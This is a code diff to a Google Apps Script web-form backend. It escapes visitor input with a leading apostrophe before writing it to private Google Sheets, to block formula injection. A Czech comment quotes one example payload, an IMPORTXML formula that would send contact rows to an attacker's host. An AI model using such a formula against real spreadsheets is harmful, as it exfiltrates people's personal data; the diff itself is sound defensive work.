@@ -237,6 +237,14 @@ function handleReferenceRequest_(body) {
   return json_({ ok: true });
 }
 
+// Text od návštěvníka webu do buňky. Začíná-li na = + - @, Sheets ho při appendRow spustí jako VZOREC:
+// např. =IMPORTXML("https://utocnik/?"&B2:B50;"//a") by při otevření tabulky poslal kontakty z listu ven.
+// Apostrof na začátku = „tohle je text" (v buňce není vidět). Bonus: telefon „+420 …" už není #ERROR!.
+function bunka_(v) {
+  var s = String(v == null ? '' : v);
+  return /^\s*[=+\-@]/.test(s) ? "'" + s : s;
+}
+
 function logLead_(d) {
   var ss = neverejnaTabulka_();                 // osobní údaje NIKDY do veřejné tabulky
   var sh = ss.getSheetByName('leady_reference') || ss.insertSheet('leady_reference');
@@ -245,7 +253,7 @@ function logLead_(d) {
   // list založený před přidáním sloupce „odkud_nas_znate": doplnit hlavičku, data se nepřepisují
   else if (sh.getRange(1, headers.length).getValue() === '') sh.getRange(1, headers.length).setValue(headers[headers.length - 1]);
   sh.appendRow([
-    new Date(), d.email, d.domain, d.phone, d.name, d.position, d.source, d.consent, d.referral || ''
+    new Date(), bunka_(d.email), bunka_(d.domain), bunka_(d.phone), bunka_(d.name), bunka_(d.position), bunka_(d.source), d.consent, bunka_(d.referral || '')
   ]);
 }
 
@@ -307,7 +315,7 @@ function handleHit_(body) {
     var sh = ss.getSheetByName('navstevy') || ss.insertSheet('navstevy');
     if (sh.getLastRow() === 0) sh.appendRow(['cas', 'typ', 'stranka', 'zdroj', 'akce']);
     var cas = Utilities.formatDate(new Date(), 'Europe/Prague', 'yyyy-MM-dd HH:mm:ss');
-    sh.appendRow([cas, t, path, zdroj, name]);
+    sh.appendRow([cas, t, bunka_(path), bunka_(zdroj), bunka_(name)]);
   } catch (e) {}
   return json_({ ok: true });
 }
@@ -378,7 +386,7 @@ function logApplication_(d) {
   var ss = neverejnaTabulka_();                 // osobní údaje NIKDY do veřejné tabulky
   var sh = ss.getSheetByName('reakce_pozice') || ss.insertSheet('reakce_pozice');
   if (sh.getLastRow() === 0) sh.appendRow(['cas', 'pozice_id', 'pozice', 'misto', 'jmeno', 'kontakt', 'zprava', 'zdroj']);
-  sh.appendRow([d.cas, d.id, d.position, d.loc, d.name, d.contact, d.note, d.source]);
+  sh.appendRow([d.cas, bunka_(d.id), bunka_(d.position), bunka_(d.loc), bunka_(d.name), bunka_(d.contact), bunka_(d.note), bunka_(d.source)]);
 }
 
 // Interní upozornění na reakce: strop za hodinu (nezávislý na stropu pro e-maily ven)
@@ -416,7 +424,7 @@ function handleInquiry_(body) {
   var ss = neverejnaTabulka_();                 // kontakty klientů NIKDY do veřejné tabulky
   var sh = ss.getSheetByName('poptavky') || ss.insertSheet('poptavky');
   if (sh.getLastRow() === 0) sh.appendRow(['cas', 'firma', 'jmeno', 'kontakt', 'popis', 'zdroj']);
-  sh.appendRow([cas, company, name, contact, note, source]);
+  sh.appendRow([cas, bunka_(company), bunka_(name), bunka_(contact), bunka_(note), bunka_(source)]);
 
   var kam = prop_('INQUIRY_TO', prop_('APPLY_TO', 'info@sintera.cz'));
   var contactEmail = emailDomain_(contact) ? contact.toLowerCase() : '';
